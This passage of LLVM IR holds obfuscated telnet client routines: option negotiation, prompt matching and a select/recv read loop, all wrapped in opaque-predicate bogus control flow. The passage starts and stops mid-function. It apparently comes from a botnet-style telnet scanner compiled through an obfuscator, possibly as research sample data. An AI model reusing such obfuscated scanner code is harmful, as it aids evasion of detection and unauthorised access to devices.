originalBBpart24:                                 ; preds = %originalBB1
  br label %101

; <label>:62:                                     ; preds = %39
  %63 = load i32, i32* @x.59
  %64 = load i32, i32* @y.60
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  %71 = load i8*, i8** %6, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 3, %74
  %76 = load i32, i32* @x.59
  %77 = load i32, i32* @y.60
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %84, label %92

; <label>:84:                                     ; preds = %originalBBpart28
  %85 = load i8*, i8** %6, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 1
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 253
  %90 = select i1 %89, i32 251, i32 253
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %8, align 1
  br label %100

; <label>:92:                                     ; preds = %originalBBpart28
  %93 = load i8*, i8** %6, align 8
  %94 = getelementptr inbounds i8, i8* %93, i64 1
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 253
  %98 = select i1 %97, i32 252, i32 254
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %8, align 1
  br label %100

; <label>:100:                                    ; preds = %92, %84
  br label %101

; <label>:101:                                    ; preds = %100, %originalBBpart24
  br label %102

; <label>:102:                                    ; preds = %101, %originalBBpart2
  %103 = load i32, i32* %5, align 4
  %104 = call i64 @send(i32 %103, i8* %8, i64 1, i32 16384)
  %105 = load i32, i32* %5, align 4
  %106 = load i8*, i8** %6, align 8
  %107 = getelementptr inbounds i8, i8* %106, i64 2
  %108 = call i64 @send(i32 %105, i8* %107, i64 1, i32 16384)
  br label %126

; <label>:109:                                    ; preds = %3
  %110 = load i32, i32* @x.59
  %111 = load i32, i32* @y.60
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  %118 = load i32, i32* @x.59
  %119 = load i32, i32* @y.60
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %126

; <label>:126:                                    ; preds = %originalBBpart212, %102
  store i32 0, i32* %4, align 4
  br label %127

; <label>:127:                                    ; preds = %126, %13
  %128 = load i32, i32* %4, align 4
  ret i32 %128

originalBBalteredBB:                              ; preds = %originalBB, %22
  store i8 -2, i8* %8, align 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  store i8 -4, i8* %8, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %129 = load i8*, i8** %6, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 3, %132
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.61
  %3 = load i32, i32* @y.62
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #9
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.61
  %20 = load i32, i32* @y.62
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %193, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = sext i32 %28 to i64
  %30 = load i8*, i8** %12, align 8
  %31 = call i64 @strlen(i8* %30) #9
  %32 = icmp ult i64 %29, %31
  br i1 %32, label %33, label %196

; <label>:33:                                     ; preds = %27
  br label %34

; <label>:34:                                     ; preds = %138, %33
  %35 = load i32, i32* @x.61
  %36 = load i32, i32* @y.62
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* %13, align 4
  %44 = load i32, i32* %15, align 4
  %45 = icmp sgt i32 %43, %44
  %46 = load i32, i32* @x.61
  %47 = load i32, i32* @y.62
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %120

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i8*, i8** %11, align 8
  %56 = load i32, i32* %13, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i32, i32* %15, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %60
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %118, label %66

; <label>:66:                                     ; preds = %54
  %67 = load i32, i32* @x.61
  %68 = load i32, i32* @y.62
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i8*, i8** %11, align 8
  %76 = load i32, i32* %13, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i32, i32* %15, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, %80
  %82 = getelementptr inbounds i8, i8* %78, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 32
  %86 = load i32, i32* @x.61
  %87 = load i32, i32* @y.62
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br i1 %85, label %118, label %94

; <label>:94:                                     ; preds = %originalBBpart215
  %95 = load i8*, i8** %11, align 8
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = load i32, i32* %15, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 0, %100
  %102 = getelementptr inbounds i8, i8* %98, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = icmp eq i32 %104, 13
  br i1 %105, label %118, label %106

; <label>:106:                                    ; preds = %94
  %107 = load i8*, i8** %11, align 8
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i32, i32* %15, align 4
  %112 = sext i32 %111 to i64
  %113 = sub i64 0, %112
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp eq i32 %116, 10
  br label %118

; <label>:118:                                    ; preds = %106, %94, %originalBBpart215, %54
  %119 = phi i1 [ true, %94 ], [ true, %originalBBpart215 ], [ true, %54 ], [ %117, %106 ]
  br label %120

; <label>:120:                                    ; preds = %118, %originalBBpart24
  %121 = phi i1 [ false, %originalBBpart24 ], [ %119, %118 ]
  %122 = load i32, i32* @x.61
  %123 = load i32, i32* @y.62
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %120
  %130 = load i32, i32* @x.61
  %131 = load i32, i32* @y.62
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %121, label %138, label %141

; <label>:138:                                    ; preds = %originalBBpart219
  %139 = load i32, i32* %15, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %15, align 4
  br label %34

; <label>:141:                                    ; preds = %originalBBpart219
  %142 = load i8*, i8** %11, align 8
  %143 = load i32, i32* %13, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  %146 = load i32, i32* %15, align 4
  %147 = sext i32 %146 to i64
  %148 = sub i64 0, %147
  %149 = getelementptr inbounds i8, i8* %145, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = load i8*, i8** %12, align 8
  %153 = load i32, i32* %14, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = icmp eq i32 %151, %157
  br i1 %158, label %159, label %176

; <label>:159:                                    ; preds = %141
  %160 = load i32, i32* @x.61
  %161 = load i32, i32* @y.62
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %159
  store i32 1, i32* %10, align 4
  %168 = load i32, i32* @x.61
  %169 = load i32, i32* @y.62
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %197

; <label>:176:                                    ; preds = %141
  %177 = load i32, i32* @x.61
  %178 = load i32, i32* @y.62
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %176
  %185 = load i32, i32* @x.61
  %186 = load i32, i32* @y.62
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %193

; <label>:193:                                    ; preds = %originalBBpart227
  %194 = load i32, i32* %14, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %14, align 4
  br label %27

; <label>:196:                                    ; preds = %27
  store i32 0, i32* %10, align 4
  br label %197

; <label>:197:                                    ; preds = %196, %originalBBpart223
  %198 = load i32, i32* %10, align 4
  ret i32 %198

originalBBalteredBB:                              ; preds = %originalBB, %1
  %199 = alloca i32, align 4
  %200 = alloca i8*, align 8
  %201 = alloca i8*, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  store i8* %0, i8** %200, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8** %201, align 8
  %205 = load i8*, i8** %200, align 8
  %206 = call i64 @strlen(i8* %205) #9
  %207 = trunc i64 %206 to i32
  store i32 %207, i32* %202, align 4
  store i32 0, i32* %204, align 4
  store i32 0, i32* %203, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %208 = load i32, i32* %13, align 4
  %209 = load i32, i32* %15, align 4
  %210 = icmp sgt i32 %208, %209
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  %211 = load i8*, i8** %11, align 8
  %212 = load i32, i32* %13, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds i8, i8* %211, i64 %213
  %215 = load i32, i32* %15, align 4
  %216 = sext i32 %215 to i64
  %_ = sub i64 0, %216
  %gen = mul i64 %_, %216
  %_7 = sub i64 0, 0
  %gen8 = add i64 %_7, %216
  %_9 = sub i64 0, 0
  %gen10 = add i64 %_9, %216
  %_11 = sub i64 0, %216
  %gen12 = mul i64 %_11, %216
  %_13 = shl i64 0, %216
  %217 = sub i64 0, %216
  %218 = getelementptr inbounds i8, i8* %214, i64 %217
  %219 = load i8, i8* %218, align 1
  %220 = sext i8 %219 to i32
  %221 = icmp eq i32 %220, 32
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %120
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %159
  store i32 1, i32* %10, align 4
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %176
  br label %originalBB25
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %248, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %96

; <label>:38:                                     ; preds = %33
  %39 = load i32, i32* @x.63
  %40 = load i32, i32* @y.64
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %48 = load i64, i64* %47, align 8
  %49 = icmp sgt i64 %48, 0
  %50 = load i32, i32* @x.63
  %51 = load i32, i32* @y.64
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %78, label %58

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = load i32, i32* @x.63
  %60 = load i32, i32* @y.64
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %68 = load i64, i64* %67, align 8
  %69 = icmp sgt i64 %68, 0
  %70 = load i32, i32* @x.63
  %71 = load i32, i32* @y.64
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %78

; <label>:78:                                     ; preds = %originalBBpart24, %originalBBpart2
  %79 = phi i1 [ true, %originalBBpart2 ], [ %69, %originalBBpart24 ]
  %80 = load i32, i32* @x.63
  %81 = load i32, i32* @y.64
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %88 = load i32, i32* @x.63
  %89 = load i32, i32* @y.64
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %96

; <label>:96:                                     ; preds = %originalBBpart28, %33
  %97 = phi i1 [ false, %33 ], [ %79, %originalBBpart28 ]
  br i1 %97, label %98, label %249

; <label>:98:                                     ; preds = %96
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %101 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 0
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %101) #3, !srcloc !5
  %103 = extractvalue { i64, i64* } %102, 0
  %104 = extractvalue { i64, i64* } %102, 1
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %24, align 4
  %106 = ptrtoint i64* %104 to i64
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %25, align 4
  br label %108

; <label>:108:                                    ; preds = %99
  %109 = load i32, i32* %10, align 4
  %110 = srem i32 %109, 64
  %111 = zext i32 %110 to i64
  %112 = shl i64 1, %111
  %113 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %114 = load i32, i32* %10, align 4
  %115 = sdiv i32 %114, 64
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [16 x i64], [16 x i64]* %113, i64 0, i64 %116
  %118 = load i64, i64* %117, align 8
  %119 = or i64 %118, %112
  store i64 %119, i64* %117, align 8
  %120 = load i32, i32* %10, align 4
  %121 = add nsw i32 %120, 1
  %122 = call i32 @select(i32 %121, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %123 = icmp slt i32 %122, 1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %108
  br label %249

; <label>:125:                                    ; preds = %108
  %126 = load i8*, i8** %15, align 8
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8* %129, i8** %23, align 8
  %130 = load i32, i32* %10, align 4
  %131 = load i8*, i8** %23, align 8
  %132 = call i64 @recv(i32 %130, i8* %131, i64 1, i32 0)
  %133 = trunc i64 %132 to i32
  store i32 %133, i32* %19, align 4
  %134 = load i32, i32* %19, align 4
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %155, label %136

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* @x.63
  %138 = load i32, i32* @y.64
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %136
  %145 = load i32, i32* %19, align 4
  %146 = icmp eq i32 %145, 0
  %147 = load i32, i32* @x.63
  %148 = load i32, i32* @y.64
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %146, label %155, label %172

; <label>:155:                                    ; preds = %originalBBpart212, %125
  %156 = load i32, i32* @x.63
  %157 = load i32, i32* @y.64
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %155
  store i32 0, i32* %9, align 4
  %164 = load i32, i32* @x.63
  %165 = load i32, i32* @y.64
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %286

; <label>:172:                                    ; preds = %originalBBpart212
  %173 = load i32, i32* %19, align 4
  %174 = load i32, i32* %18, align 4
  %175 = add nsw i32 %174, %173
  store i32 %175, i32* %18, align 4
  %176 = load i8*, i8** %23, align 8
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 255
  br i1 %179, label %180, label %218

; <label>:180:                                    ; preds = %172
  %181 = load i32, i32* %10, align 4
  %182 = load i8*, i8** %23, align 8
  %183 = getelementptr inbounds i8, i8* %182, i64 1
  %184 = call i64 @recv(i32 %181, i8* %183, i64 2, i32 0)
  %185 = trunc i64 %184 to i32
  store i32 %185, i32* %19, align 4
  %186 = load i32, i32* %19, align 4
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %191, label %188

; <label>:188:                                    ; preds = %180
  %189 = load i32, i32* %19, align 4
  %190 = icmp eq i32 %189, 0
  br i1 %190, label %191, label %192

; <label>:191:                                    ; preds = %188, %180
  store i32 0, i32* %9, align 4
  br label %286

; <label>:192:                                    ; preds = %188
  %193 = load i32, i32* %19, align 4
  %194 = load i32, i32* %18, align 4
  %195 = add nsw i32 %194, %193
  store i32 %195, i32* %18, align 4
  %196 = load i32, i32* %10, align 4
  %197 = load i8*, i8** %23, align 8
  %198 = call i32 @negotiate(i32 %196, i8* %197, i32 3)
  %199 = icmp ne i32 %198, 0
  br i1 %199, label %217, label %200

; <label>:200:                                    ; preds = %192
  %201 = load i32, i32* @x.63
  %202 = load i32, i32* @y.64
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %200
  store i32 0, i32* %9, align 4
  %209 = load i32, i32* @x.63
  %210 = load i32, i32* @y.64
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %286

; <label>:217:                                    ; preds = %192
  br label %248

; <label>:218:                                    ; preds = %172
  %219 = load i8*, i8** %15, align 8
  %220 = load i8*, i8** %11, align 8
  %221 = call i8* @strstr(i8* %219, i8* %220) #9
  %222 = icmp ne i8* %221, null
  br i1 %222, label %230, label %223

; <label>:223:                                    ; preds = %218
  %224 = load i32, i32* %12, align 4
  %225 = icmp ne i32 %224, 0
  br i1 %225, label %226, label %247

; <label>:226:                                    ; preds = %223
  %227 = load i8*, i8** %15, align 8
  %228 = call i32 @matchPrompt(i8* %227)
  %229 = icmp ne i32 %228, 0
  br i1 %229, label %230, label %247

; <label>:230:                                    ; preds = %226, %218
  %231 = load i32, i32* @x.63
  %232 = load i32, i32* @y.64
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %230
  store i32 1, i32* %20, align 4
  %239 = load i32, i32* @x.63
  %240 = load i32, i32* @y.64
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %249

; <label>:247:                                    ; preds = %226, %223
  br label %248

; <label>:248:                                    ; preds = %247, %217
  br label %33

; <label>:249:                                    ; preds = %originalBBpart224, %124, %96
  %250 = load i32, i32* @x.63
  %251 = load i32, i32* @y.64
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %249
  %258 = load i32, i32* %20, align 4
  %259 = icmp ne i32 %258, 0
  %260 = load i32, i32* @x.63
  %261 = load i32, i32* @y.64
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %259, label %268, label %285

; <label>:268:                                    ; preds = %originalBBpart228
  %269 = load i32, i32* @x.63
  %270 = load i32, i32* @y.64
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %268
  store i32 1, i32* %9, align 4
  %277 = load i32, i32* @x.63
  %278 = load i32, i32* @y.64
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %286

; <label>:285:                                    ; preds = %originalBBpart228
  store i32 0, i32* %9, align 4
  br label %286

; <label>:286:                                    ; preds = %285, %originalBBpart232, %originalBBpart220, %191, %originalBBpart216
